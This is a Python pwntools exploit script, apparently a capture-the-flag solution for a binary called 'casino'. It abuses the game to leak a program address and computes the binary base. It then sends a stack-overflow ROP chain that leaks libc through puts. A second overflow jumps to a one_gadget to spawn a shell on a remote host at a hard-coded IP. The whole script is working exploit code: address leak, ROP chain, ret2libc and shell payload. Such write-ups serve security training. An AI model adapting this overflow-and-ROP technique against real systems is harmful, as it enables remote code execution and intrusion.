from pwn import *
from termcolor import colored

text = colored(' DEBUG ', 'red', attrs=['reverse', 'blink', 'bold'])
# context.log_level = 'DEBUG'
DEBUG = 0
file = './casino'
exe = ELF(file)


def roulette(io, number):
    success("===================<ROULETTE>=================")
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"> ", number)
    success("===================</ROULETTE>================")


def main(io, libc=None):
    # declared
    # exploit
    success("Select 1. Pay")
    io.sendlineafter(b"> ", b"1")   # select Pay

    for i in range(11):
        roulette(io, b"\x00")

    # # less than 6 diamonds
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"> ", b"x00")

    recv = io.recvuntil(b"is")
    _start = int(recv[recv.find(b"[-]") + 3:-3])

    info("_start binary:        %#x"    % _start)
    exe.address = _start - exe.sym["_start"]
    binary_base = exe.address
    info("Binary base:          %#x"    % binary_base)
    # # overflow here, last chance run by a thread

    pop_rdi = binary_base + 0x18f3

    payload = b"\x00"*0x38
    payload += p64(pop_rdi)
    payload += p64(exe.got["puts"])
    payload += p64(exe.plt["puts"]) 
    payload += p64(pop_rdi + 1)
    payload += p64(exe.sym["last_chance"])

    payload = payload.ljust(0x900 - 1, b"\x00")
    io.sendlineafter(b"> ", payload)

    
    io.recvuntil(b"\n")
    output = io.recvline()
    output = output[-7:-1]
    puts_libc = int(output[::-1].hex(), 16)

    info("puts libc:        %#x" % puts_libc)
    libc.address = puts_libc - libc.sym["puts"]
    info("libc base:        %#x" % libc.address)

    if DEBUG:
        one_gadget = libc.address + 0x4f2a5
    else:
        one_gadget = libc.address + 0x4f3d5
    payload = b"\x00"*0x38
    payload += p64(one_gadget)

    payload = payload.ljust(0x900 - 1, b"\x00")
    io.sendlineafter(b"> ", payload)


if __name__ == '__main__':
    if DEBUG:
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        #env = {'LD_PRELOAD': os.path.join(os.getcwd(), 'libc.so.6')}
        #io = process([os.path.join(os.getcwd(), 'ld-linux.so.2'), file], env=env)
        io = process(file)
        input(text)
    else:
        libc = ELF('./libc-2.27.so')
        io = remote('178.128.173.79', 31552)

    main(io, libc)
    io.interactive()
